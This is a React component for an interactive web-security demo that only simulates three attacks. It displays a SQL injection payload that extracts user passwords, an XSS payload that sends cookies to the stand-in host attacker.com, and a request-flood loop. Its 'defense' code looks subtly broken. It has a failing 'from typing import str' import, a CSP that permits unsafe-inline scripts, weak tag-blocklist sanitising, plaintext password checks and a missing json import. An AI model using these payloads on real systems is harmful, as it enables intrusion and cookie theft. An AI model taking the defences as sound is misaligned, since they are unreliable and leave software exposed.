'use client';

import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Shield, Terminal, Database, Globe, Zap, AlertTriangle, CheckCircle, Play, RotateCcw } from 'lucide-react';

interface SecurityDemoProps {
  theme: 'iot' | 'security';
}

export default function SecurityDemo({ theme }: SecurityDemoProps) {
  const [selectedAttack, setSelectedAttack] = useState<string | null>(null);
  const [isExecuting, setIsExecuting] = useState(false);
  const [showDefense, setShowDefense] = useState(false);

  const attacks = [
    {
      id: 'sqli',
      name: 'SQL Injection',
      icon: <Database className="w-6 h-6" />,
      description: 'Exploit vulnerable database queries to extract sensitive data',
      severity: 'High',
      steps: [
        'Identify vulnerable input field',
        'Test for SQL injection points',
        'Craft malicious payload',
        'Extract database contents',
        'Demonstrate data breach'
      ],
      payload: "' OR '1'='1' UNION SELECT username, password FROM users--",
      defense: `# SQL Injection Prevention
import sqlite3
from typing import Optional

def secure_login(username: str, password: str) -> Optional[dict]:
    """Secure login implementation with parameterized queries"""
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # Use parameterized query to prevent SQL injection
    cursor.execute(
        "SELECT id, username, role FROM users WHERE username = ? AND password = ?",
        (username, password)
    )
    
    result = cursor.fetchone()
    conn.close()
    
    if result:
        return {
            'id': result[0],
            'username': result[1],
            'role': result[2]
        }
    return None

# Input validation
def validate_input(user_input: str) -> bool:
    """Validate user input to prevent malicious payloads"""
    dangerous_chars = ["'", '"', ';', '--', '/*', '*/']
    return not any(char in user_input for char in dangerous_chars)`
    },
    {
      id: 'xss',
      name: 'Cross-Site Scripting',
      icon: <Globe className="w-6 h-6" />,
      description: 'Inject malicious scripts into web applications',
      severity: 'Medium',
      steps: [
        'Find input reflection points',
        'Test for XSS vulnerabilities',
        'Craft JavaScript payload',
        'Execute client-side code',
        'Demonstrate session hijacking'
      ],
      payload: '<script>alert("XSS Vulnerability Found!"); document.location="http://attacker.com/steal?cookie="+document.cookie;</script>',
      defense: `# XSS Prevention
import html
import re
from typing import str

def sanitize_input(user_input: str) -> str:
    """Sanitize user input to prevent XSS attacks"""
    # HTML encode special characters
    sanitized = html.escape(user_input)
    
    # Remove potentially dangerous tags
    dangerous_tags = ['<script>', '</script>', '<iframe>', '</iframe>']
    for tag in dangerous_tags:
        sanitized = sanitized.replace(tag.lower(), '')
        sanitized = sanitized.replace(tag.upper(), '')
    
    return sanitized

# Content Security Policy
def set_csp_headers():
    """Set Content Security Policy headers"""
    return {
        'Content-Security-Policy': 
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: https:;"
    }`
    },
    {
      id: 'dos',
      name: 'Denial of Service',
      icon: <Zap className="w-6 h-6" />,
      description: 'Overwhelm server resources to cause service disruption',
      severity: 'High',
      steps: [
        'Identify target endpoints',
        'Analyze resource consumption',
        'Generate high-volume requests',
        'Monitor server response',
        'Demonstrate service disruption'
      ],
      payload: 'for i in range(10000): requests.get("http://target.com/api/heavy-operation")',
      defense: `# DoS Protection
from flask import Flask, request, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import time

app = Flask(__name__)

# Rate limiting
limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["100 per hour"]
)

@app.route('/api/data')
@limiter.limit("10 per minute")
def get_data():
    """Rate-limited API endpoint"""
    return jsonify({"data": "protected content"})

# Request timeout and size limits
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max

# Connection pooling and caching
import redis
cache = redis.Redis(host='localhost', port=6379, db=0)

def cache_response(key: str, data: dict, ttl: int = 300):
    """Cache responses to reduce server load"""
    cache.setex(key, ttl, json.dumps(data))`
    }
  ];

  const executeAttack = async () => {
    if (!selectedAttack) return;
    
    setIsExecuting(true);
    setShowDefense(false);

    // Simulate attack execution
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    setIsExecuting(false);
    setShowDefense(true);
  };

  const resetDemo = () => {
    setSelectedAttack(null);
    setIsExecuting(false);
    setShowDefense(false);
  };

  const currentAttack = attacks.find(a => a.id === selectedAttack);

  return (
    <section className="py-20 px-6">
      <div className="max-w-7xl mx-auto">
        <motion.div
          initial={{ opacity: 0, y: 50 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          className="text-center mb-16"
        >
          <h2 className="text-4xl md:text-5xl font-bold text-white mb-6">
            Security Testing Demo
          </h2>
          <p className="text-xl text-slate-300 max-w-3xl mx-auto">
            Interactive demonstration of common attack vectors and their mitigations
          </p>
        </motion.div>

        {!selectedAttack ? (
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {attacks.map((attack, index) => (
              <motion.div
                key={attack.id}
                initial={{ opacity: 0, y: 50 }}
                whileInView={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.5, delay: index * 0.1 }}
              >
                <Card 
                  className="bg-slate-800/50 border-slate-700 hover:border-rose-400/50 transition-all duration-300 cursor-pointer h-full"
                  onClick={() => setSelectedAttack(attack.id)}
                >
                  <CardHeader>
                    <div className="flex items-center gap-3 mb-2">
                      <div className="p-2 bg-rose-500/20 rounded-lg text-rose-400">
                        {attack.icon}
                      </div>
                      <div className="flex-1">
                        <CardTitle className="text-white">{attack.name}</CardTitle>
                        <Badge 
                          variant={attack.severity === 'High' ? 'destructive' : 'secondary'}
                          className={attack.severity === 'Medium' ? 'bg-yellow-500/20 text-yellow-400' : ''}
                        >
                          {attack.severity} Risk
                        </Badge>
                      </div>
                    </div>
                  </CardHeader>
                  <CardContent>
                    <p className="text-slate-300 text-sm mb-4">{attack.description}</p>
                    <Button className="w-full bg-rose-500 hover:bg-rose-400 text-white">
                      <Play className="w-4 h-4 mr-2" />
                      Try Exploit
                    </Button>
                  </CardContent>
                </Card>
              </motion.div>
            ))}
          </div>
        ) : (
          <AnimatePresence>
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="space-y-8"
            >
              {/* Attack Header */}
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <div className="p-3 bg-rose-500/20 rounded-lg text-rose-400">
                    {currentAttack?.icon}
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{currentAttack?.name}</h3>
                    <p className="text-slate-400">{currentAttack?.description}</p>
                  </div>
                </div>
                <Button
                  variant="outline"
                  onClick={resetDemo}
                  className="border-slate-600 text-slate-300 hover:bg-slate-800"
                >
                  <RotateCcw className="w-4 h-4 mr-2" />
                  Back to Menu
                </Button>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                {/* Attack Execution */}
                <Card className="bg-slate-800/50 border-slate-700">
                  <CardHeader>
                    <CardTitle className="text-rose-400 flex items-center gap-2">
                      <Terminal className="w-5 h-5" />
                      Attack Execution
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-6">
                    {/* Attack Steps */}
                    <div className="space-y-3">
                      {currentAttack?.steps.map((step, index) => (
                        <motion.div
                          key={index}
                          initial={{ opacity: 0.3 }}
                          animate={{ 
                            opacity: isExecuting && index <= Math.floor(Date.now() / 1000) % 5 ? 1 : 0.3 
                          }}
                          className="flex items-center gap-3"
                        >
                          <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold ${
                            isExecuting && index <= Math.floor(Date.now() / 1000) % 5
                              ? 'bg-rose-500 text-white'
                              : 'bg-slate-700 text-slate-400'
                          }`}>
                            {index + 1}
                          </div>
                          <span className="text-slate-300">{step}</span>
                        </motion.div>
                      ))}
                    </div>

                    {/* Payload */}
                    <div className="space-y-2">
                      <h4 className="font-semibold text-slate-300">Attack Payload:</h4>
                      <div className="bg-slate-900 p-3 rounded-lg font-mono text-sm text-rose-300 overflow-x-auto">
                        {currentAttack?.payload}
                      </div>
                    </div>

                    {/* Execute Button */}
                    <Button
                      onClick={executeAttack}
                      disabled={isExecuting}
                      className="w-full bg-rose-500 hover:bg-rose-400 text-white"
                    >
                      {isExecuting ? (
                        <>
                          <motion.div
                            animate={{ rotate: 360 }}
                            transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                            className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                          />
                          Executing Attack...
                        </>
                      ) : (
                        <>
                          <Play className="w-4 h-4 mr-2" />
                          Execute Attack
                        </>
                      )}
                    </Button>

                    {/* Attack Status */}
                    {isExecuting && (
                      <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        className="p-3 bg-red-500/10 border border-red-500/20 rounded-lg"
                      >
                        <div className="flex items-center gap-2">
                          <AlertTriangle className="w-4 h-4 text-red-400" />
                          <span className="text-red-400 font-semibold">Attack in Progress</span>
                        </div>
                        <p className="text-red-300 text-sm mt-1">
                          Vulnerability successfully exploited. System compromised.
                        </p>
                      </motion.div>
                    )}
                  </CardContent>
                </Card>

                {/* Defense Code */}
                <Card className="bg-slate-900 border-slate-700">
                  <CardHeader>
                    <CardTitle className="text-green-400 flex items-center gap-2">
                      <Shield className="w-5 h-5" />
                      Defense Implementation
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {showDefense ? (
                      <motion.div
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="space-y-4"
                      >
                        <div className="p-3 bg-green-500/10 border border-green-500/20 rounded-lg">
                          <div className="flex items-center gap-2">
                            <CheckCircle className="w-4 h-4 text-green-400" />
                            <span className="text-green-400 font-semibold">Mitigation Available</span>
                          </div>
                          <p className="text-green-300 text-sm mt-1">
                            Secure implementation prevents this attack vector.
                          </p>
                        </div>
                        
                        <pre className="text-sm text-slate-300 overflow-x-auto whitespace-pre-wrap font-mono bg-black p-4 rounded-lg max-h-96">
                          {currentAttack?.defense}
                        </pre>
                      </motion.div>
                    ) : (
                      <div className="text-center py-12 text-slate-400">
                        <Shield className="w-12 h-12 mx-auto mb-4 opacity-50" />
                        <p>Execute the attack to reveal defense code</p>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>

              {/* Test Results Summary */}
              {showDefense && (
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.5 }}
                >
                  <Card className="bg-slate-800/30 border-slate-700">
                    <CardContent className="pt-6">
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 text-sm">
                        <div>
                          <h4 className="font-semibold text-rose-400 mb-3">Attack Results</h4>
                          <ul className="text-slate-400 space-y-2">
                            <li>• Vulnerability successfully exploited</li>
                            <li>• Sensitive data accessed</li>
                            <li>• System integrity compromised</li>
                            <li>• Potential for privilege escalation</li>
                          </ul>
                        </div>
                        <div>
                          <h4 className="font-semibold text-green-400 mb-3">Defense Measures</h4>
                          <ul className="text-slate-400 space-y-2">
                            <li>• Input validation implemented</li>
                            <li>• Parameterized queries used</li>
                            <li>• Rate limiting applied</li>
                            <li>• Security headers configured</li>
                          </ul>
                        </div>
                        <div>
                          <h4 className="font-semibold text-cyan-400 mb-3">Best Practices</h4>
                          <ul className="text-slate-400 space-y-2">
                            <li>• Regular security audits</li>
                            <li>• Penetration testing</li>
                            <li>• Security awareness training</li>
                            <li>• Incident response planning</li>
                          </ul>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                </motion.div>
              )}
            </motion.div>
          </AnimatePresence>
        )}
      </div>
    </section>
  );
}
